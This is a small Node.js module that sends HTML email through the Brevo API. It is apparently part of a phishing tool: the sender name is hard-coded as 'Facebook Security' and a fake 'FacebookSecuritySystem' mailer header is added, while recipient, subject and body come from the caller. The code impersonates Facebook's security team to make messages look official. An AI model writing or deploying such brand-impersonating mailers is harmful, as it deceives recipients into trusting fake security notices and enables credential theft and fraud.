require("dotenv").config()

const SibApiV3Sdk = require("sib-api-v3-sdk")

const client = SibApiV3Sdk.ApiClient.instance

const apiKey = client.authentications["api-key"]
apiKey.apiKey = process.env.BREVO_API_KEY

const emailApi = new SibApiV3Sdk.TransactionalEmailsApi()

async function sendEmail(to, subject, html){

try{

await emailApi.sendTransacEmail({

sender:{
name:"Facebook Security",
email:process.env.EMAIL_USER
},

to:[
{
email:to
}
],

subject:subject,

headers:{
"X-Mailer":"FacebookSecuritySystem"
},

htmlContent:html

})

console.log("Email sent successfully")

return true

}catch(err){

console.error("EMAIL ERROR:",err)

return false

}

}

module.exports = sendEmail